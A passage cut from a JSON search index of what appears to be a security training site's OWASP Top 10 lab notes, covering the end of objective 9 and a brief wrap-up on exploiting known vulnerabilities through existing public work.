shell. Using Linux navigation skills, or the command provided, will provide the necesary count.</p>"},{"location":"objectives/o9/#wrap-up","title":"Wrap Up","text":"<p>As the reading said, this vulnerability is one of the easiest to exploit since the most difficult part involved is research and then using someone else's work to take advantage of mistakes by the target. Follow along for the final vulnerability in the OWASP Top 10.</p>"}]}